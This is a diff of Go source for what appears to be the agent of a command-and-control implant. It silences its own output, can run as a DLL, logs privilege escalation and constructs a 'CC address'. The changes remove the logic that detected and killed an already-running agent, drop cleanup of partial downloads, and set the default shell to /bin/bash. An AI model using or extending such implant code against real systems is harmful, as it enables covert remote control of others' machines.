@@ -6,7 +6,6 @@ import (
 	"net"
 	"os"
 	"os/user"
-	"path/filepath"
 	"runtime"
 	"strings"
 	"time"
@@ -28,7 +27,6 @@ import (
 
 func agent_main() {
 	var err error
-	replace_agent := false
 
 	// accept env vars
 	null_file, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0o644)
@@ -39,7 +37,6 @@ func agent_main() {
 	os.Stderr = null_file
 	os.Stdout = null_file
 
-	replace_agent = os.Getenv("REPLACE_AGENT") == "true"
 	// Check if we're running as a library (CGO build)
 	is_dll := IsDLL()
 
@@ -70,43 +67,6 @@ func agent_main() {
 			logging.Printf("%d is invoked by DLL in %d",
 				os.Getpid(), os.Getppid())
 		}
-	}
-
-test_agent:
-	alive, pid := agentutils.CheckExistingInstance()
-	if alive {
-		proc, err := os.FindProcess(pid)
-		if err != nil {
-			logging.Printf("Failed to find agent process with PID %d: %v", pid, err)
-		}
-
-		// check if agent is responsive
-		if isAgentAliveSocket() {
-			if os.Geteuid() == 0 && util.ProcUID(pid) != "0" {
-				logging.Println("Escalating privilege...")
-			} else if !replace_agent {
-				logging.Printf("[%d->%d] Agent is already running and responsive, waiting...",
-					os.Getppid(),
-					os.Getpid())
-
-				util.TakeASnap()
-				goto test_agent
-			}
-		} else {
-			go socketListen()
-		}
-
-		// if agent is not responsive, kill it, and start a new instance
-		// after IsAgentAlive(), the PID file gets replaced with current process's PID
-		// if we kill it, we will be killing ourselves
-		if proc.Pid != os.Getpid() {
-			err = proc.Kill()
-			if err != nil {
-				logging.Printf("Failed to kill existing agent: %v", err)
-			}
-		}
-	} else {
-		go socketListen()
 	}
 
 	// Construct CC address
@@ -252,7 +212,7 @@ func setupEnvironment() {
 	} else {
 		os.Setenv("HOME", u.HomeDir)
 	}
-	def.DefaultShell = fmt.Sprintf("%s/bash", common.RuntimeConfig.UtilsPath)
+	def.DefaultShell = "/bin/bash"
 	if runtime.GOOS == "windows" {
 		def.DefaultShell = "elvish"
 	} else if !util.IsFileExist(def.DefaultShell) {
@@ -265,13 +225,5 @@ func setupEnvironment() {
 
 func cleanUpDownloadingFiles() {
 	logging.Println("cleanUpDownloadingFiles...")
-	err := filepath.Walk(common.RuntimeConfig.AgentRoot, func(path string, info os.FileInfo, err error) error {
-		if err == nil && strings.HasSuffix(info.Name(), ".downloading") {
-			os.RemoveAll(path)
-		}
-		return nil
-	})
-	if err != nil {
-		logging.Printf("Cleaning up *.downloading: %v", err)
-	}
+	// No more AgentRoot to clean up
 }
